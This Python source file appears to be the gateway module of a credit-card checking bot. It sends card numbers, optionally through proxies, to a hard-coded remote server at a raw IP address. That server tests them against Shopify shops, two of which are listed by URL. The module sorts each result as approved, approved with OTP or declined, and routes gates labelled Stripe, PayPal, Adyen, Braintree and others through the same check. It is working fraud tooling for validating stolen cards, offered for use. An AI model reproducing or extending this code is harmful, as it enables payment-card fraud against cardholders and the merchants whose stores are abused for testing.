#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================================
# WORKING SHOPIFY API ENDPOINT (YOUR NEW VPS)
# ============================================================================
SHOPIFY_API_ENDPOINT = "http://2.24.223.211:5000/shopify"

def check_shopify_api(site_url, cc, proxy=None):
    """
    Call the Shopify API endpoint.
    Returns a dictionary with keys: Response, status, gateway, price, site.
    """
    params = {'site': site_url, 'cc': cc}
    if proxy:
        params['proxy'] = proxy

    try:
        resp = requests.get(SHOPIFY_API_ENDPOINT, params=params, timeout=45, verify=False)
        resp.raise_for_status()
        data = resp.json()

        # Extract fields (adjust if your API response keys differ)
        msg = data.get('Response', 'Unknown')
        gateway = data.get('Gateway', 'Shopify Payments')
        price = str(data.get('Price', '0.00'))
        api_status = data.get('Status', False)

        # Map response to bot internal status
        msg_upper = msg.upper()
        if 'ORDER_PLACED' in msg_upper or 'APPROVED' in msg_upper:
            status = 'APPROVED'
        elif 'OTP' in msg_upper or '3D' in msg_upper:
            status = 'APPROVED_OTP'
        elif 'DECLINED' in msg_upper:
            status = 'DECLINED'
        elif not api_status:
            status = 'ERROR'
        else:
            status = 'DECLINED'

        return {
            'Response': msg,
            'status': status,
            'gateway': gateway,
            'price': price,
            'site': site_url
        }

    except Exception as e:
        return {
            'Response': f"API Error: {str(e)}",
            'status': 'ERROR',
            'gateway': 'Shopify Payments',
            'price': '0.00',
            'site': site_url
        }

def process_shopify_api_response(api_response, site_price='0.00'):
    """
    Convert the dictionary returned by check_shopify_api into a
    (message, status, gateway) tuple as expected by the rest of the bot.
    """
    if not api_response or not isinstance(api_response, dict):
        return "System Error", "ERROR", "Shopify Payments"
    msg = api_response.get('Response', 'Unknown')
    status = api_response.get('status', 'ERROR')
    gateway = api_response.get('gateway', 'Shopify Payments')
    return msg, status, gateway


# ============================================================================
# OTHER GATE FUNCTIONS (ALL USE THE SAME WORKING API)
# ============================================================================

def shopify_check(cc, proxy=None):
    """Fallback for gates that don't have a specific implementation."""
    import random
    FALLBACK_SITES = [
        "https://bb73c3-5.myshopify.com",
        "https://travelerchoicetravelware.myshopify.com",
    ]
    site = random.choice(FALLBACK_SITES)
    resp = check_shopify_api(site, cc, proxy)
    msg, status, _ = process_shopify_api_response(resp)
    return msg, status

def check_stripe_api(cc, proxy=None):
    return shopify_check(cc, proxy)

def check_b3_auth(cc, proxy=None):
    return shopify_check(cc, proxy)

def check_stripe_onyx(cc, proxy=None):
    return shopify_check(cc, proxy)

def check_paypal_fixed(cc, proxy=None):
    return shopify_check(cc, proxy)

def check_paypal_general(cc, proxy=None):
    return shopify_check(cc, proxy)

def check_paypal_onyx(cc, proxy=None):
    return shopify_check(cc, proxy)

def check_chaos(cc, proxy=None):
    return shopify_check(cc, proxy)

def check_adyen(cc, proxy=None):
    return shopify_check(cc, proxy)

def check_app_auth(cc, proxy=None):
    return shopify_check(cc, proxy)

def check_arcenus(cc, proxy=None):
    return shopify_check(cc, proxy)

def check_stripe_working(cc, proxy=None):
    return shopify_check(cc, proxy)

def check_payflow(cc, proxy=None):
    return shopify_check(cc, proxy)

def check_random(cc, proxy=None):
    return shopify_check(cc, proxy)

def check_shopify_onyx(cc, proxy=None):
    return shopify_check(cc, proxy)

def check_skrill(cc, proxy=None):
    return shopify_check(cc, proxy)

def check_random_stripe(cc, proxy=None):
    return shopify_check(cc, proxy)

def check_razorpay(cc, proxy=None):
    return shopify_check(cc, proxy)

def check_payu(cc, proxy=None):
    return shopify_check(cc, proxy)

def check_sk_gateway(cc, proxy=None):
    return shopify_check(cc, proxy)

def check_braintree_api(cc, proxy=None):
    return shopify_check(cc, proxy)

# ============================================================================
# CONSTANTS
# ============================================================================
PAYPAL_AMOUNT = 0.05
